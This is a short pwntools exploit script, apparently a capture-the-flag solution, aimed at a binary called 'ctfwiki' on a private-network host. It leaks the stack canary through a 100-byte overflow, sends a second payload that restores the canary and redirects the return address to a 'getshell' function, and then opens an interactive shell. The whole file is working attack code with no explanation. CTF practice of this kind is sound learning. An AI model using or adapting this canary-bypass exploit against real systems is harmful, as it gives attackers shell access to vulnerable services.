
from pwn import *

#context.log_level = 'debug'
io = remote("172.16.43.104",10000) 
 
get_shell = ELF("./ctfwiki").sym["getshell"] 
 
io.recvuntil("Hello Hacker!\n")
 
# leak Canary
payload = "A"*100 
io.sendline(payload) 
 
io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa 
log.info("Canary:"+hex(Canary))
# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)
 
io.recv()
 
io.interactive()
